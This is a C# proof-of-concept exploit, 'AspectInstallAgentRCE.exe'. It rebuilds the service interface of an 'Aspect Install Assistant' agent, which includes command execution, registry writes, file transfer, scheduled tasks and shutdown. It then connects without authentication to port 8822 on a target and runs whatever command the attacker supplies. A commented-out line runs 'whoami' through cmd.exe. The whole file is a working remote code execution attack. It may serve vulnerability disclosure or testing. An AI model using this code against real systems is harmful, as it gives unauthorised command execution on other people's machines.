using System;
using System.Collections;
using System.ServiceModel;
using System.Runtime.Serialization;
using MonoTorrent.Common;

namespace AspectInstallAssistant {

[ServiceContract(CallbackContract = typeof(IHostCallback), SessionMode = SessionMode.Required)]
public interface IHost
{
	[OperationContract(IsInitiating = true, IsOneWay = true)]
	void Connect();

	[OperationContract(IsTerminating = true, IsOneWay = true)]
	void Disconnect();

	[OperationContract(IsOneWay = true)]
	void SendString(string value);

	[OperationContract(IsOneWay = true)]
	void SendInt(int value);

	[OperationContract]
	bool SendData(DataFile value);

	[OperationContract]
	int Exec(string exe, string args, string path, bool is2008Vista);

	[OperationContract]
	bool RequestData(string value);

	[OperationContract(IsOneWay = true)]
	void startFileWatcher(string filter, string path);

	[OperationContract(IsOneWay = true)]
	void stopFileWatcher(string filter, string path);

	[OperationContract]
	string ReadReg(string key, string value);

	[OperationContract]
	void WriteReg(string key, string name, string value);

	[OperationContract]
	void WriteRegDWORD(string key, string name, int value);

	[OperationContract]
	string GetIPAddress(string machine);

	[OperationContract]
	string GetEnvVar(string envVar);

	[OperationContract(IsOneWay = true)]
	void DeleteData(string value);

	[OperationContract(IsOneWay = true)]
	void RestartMachine(int waitSecs, string comments);

	[OperationContract(IsOneWay = true)]
	void ShutdownMachine(int waitSecs, string comments);

	[OperationContract(IsOneWay = true)]
	void ReplaceRTRToken(string filepath, ArrayList tenant, string site, string location, ArrayList ArrayListsmsvr);

	[OperationContract]
	string GetDBVersionInfo(bool isSqlServer, string port, bool useNewUser);

	[OperationContract]
	bool SetPDPFiles(string machine, string port, string drive);

	[OperationContract(IsOneWay = true)]
	void StartTorrents();

	[OperationContract(IsOneWay = true)]
	void StopTorrents();

	[OperationContract(IsOneWay = true)]
	void ResumeTorrent(string infoHashHex);

	[OperationContract(IsOneWay = true)]
	void PauseTorrent(string infoHashHex);

	[OperationContract]
	TorrentState TorrentCurrentState(string infoHashHex);

	[OperationContract(IsOneWay = true)]
	void AddTorrent(string torrentPath, string destpath, ArrayList inclusionFiles, bool skipHash);

	[OperationContract]
	double TorrentProgress(string infoHashHex);

	[OperationContract(IsOneWay = true)]
	void TorrentClearDoNotDownload(string infoHashHex);

	[OperationContract]
	double TorrentDLRate(string infoHashHex);

	[OperationContract]
	double TorrentPeerULRate(string peerId);

	[OperationContract(IsOneWay = true)]
	void TorrentPeerCloseConnection(string peerId);

	[OperationContract]
	bool TorrentExists(string infoHashHex);

	[OperationContract]
	double TorrentElapsed(string infoHashHex);

	[OperationContract]
	int TorrentPeers(string infoHashHex);

	[OperationContract(IsOneWay = true)]
	void TorrentUploadSlots(string infoHashHex, int value);

	[OperationContract]
	string CreateScheduledTask(string command, string commandArgs, string workingDir, string domain, string user, string password, bool startImmediately, int startInXSeconds);

	[OperationContract]
	bool DeleteScheduledTask(string scheduledTaskName);

	[OperationContract]
	bool ScheduledTaskExists(string scheduledTaskName);
}

[DataContract]
public class DataFile
{
	private string _fileName;

	private string _dirName;

	private byte[] _data;

	private bool _isFullPath;

	[DataMember]
	public string FileName
	{
		get
		{
			return _fileName;
		}
		set
		{
			_fileName = value;
		}
	}

	[DataMember]
	public string DirName
	{
		get
		{
			return _dirName;
		}
		set
		{
			_dirName = value;
		}
	}

	[DataMember]
	public byte[] Data
	{
		get
		{
			return _data;
		}
		set
		{
			_data = value;
		}
	}

	[DataMember]
	public bool IsFullPath
	{
		get
		{
			return _isFullPath;
		}
		set
		{
			_isFullPath = value;
		}
	}
}

internal interface IHostCallback
{
	[OperationContract(IsOneWay = true)]
	void ReceiveString(string value);

	[OperationContract(IsOneWay = true)]
	void ReceiveInt(int value);

	[OperationContract(IsOneWay = true)]
	void ReceiveData(DataFile value);
}

[ServiceContract] public class MyHostCallback : IHostCallback
{
	[OperationContract(IsOneWay = true)]
	public void ReceiveString(string value) {}

	[OperationContract(IsOneWay = true)]
	public void ReceiveInt(int value) {}

	[OperationContract(IsOneWay = true)]
	public void ReceiveData(DataFile value) {}
}

public class Program {

	static void Main(string[] args) {
		if (args.Length == 0) {
			Console.WriteLine("Usage: AspectInstallAgentRCE.exe hostname [cmd]");
			return;
		}
		string target = args[0];
		NetTcpBinding binding = new NetTcpBinding(SecurityMode.None);  
		EndpointAddress addr = new EndpointAddress("net.tcp://"+target+":8822/AspectInstallAssistant/Host/tcp");
       		InstanceContext ix = new InstanceContext(new MyHostCallback());
		DuplexChannelFactory<IHost> host = new DuplexChannelFactory<IHost>(ix,binding,addr);  
		IHost client = host.CreateChannel();
		
		Console.WriteLine(client.GetEnvVar("COMPUTERNAME"));
		
		if (args.Length > 1) {
			string payloadCmd = args[1];
			string payloadArgs = "";
			if (args.Length > 2) payloadArgs = args[2];
			
			//if( client.Exec("cmd.exe","\"/c whoami > \\temp\\x.log\"","C:\\windows\\system32",true) > 0 ) {
			//	Console.Write("Command executed successfully");
			//}
			if( client.Exec(payloadCmd, payloadArgs, "C:\\windows\\system32",true) > 0 ) {
				Console.Write("Command executed successfully");
			}
		}
	}
}
}
